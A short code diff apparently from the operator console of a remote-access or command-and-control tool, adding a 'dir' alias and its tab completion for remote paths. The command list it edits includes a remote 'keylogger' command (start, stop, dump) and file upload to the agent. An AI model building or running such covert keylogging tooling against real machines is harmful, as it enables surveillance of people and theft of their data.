@@ -33,6 +33,7 @@ AGENT_COMMANDS = {
     "ps": "List running processes (native)",
     "cd": "Change working directory (native, cd <path>)",
     "ls": "Directory listing (native, ls [path])",
+    "dir": "Directory listing (alias for ls)",
     "cat": "Read file contents (native, cat <path>)",
     "keylogger": "Keystroke logger (keylogger start|stop|dump)",
     "upload": "Upload file (upload <local> <remote>)",
@@ -152,7 +153,7 @@ class ShellCompleter(Completer):
                     yield Completion(sub, start_position=-len(prefix),
                                     display_meta=desc)
 
-        elif word_count == 2 and words[0] in ("cd", "ls", "cat"):
+        elif word_count == 2 and words[0] in ("cd", "ls", "dir", "cat"):
             # Complete remote paths from cached ls entries
             for name, is_dir in self.remote_entries:
                 if name.startswith(prefix):
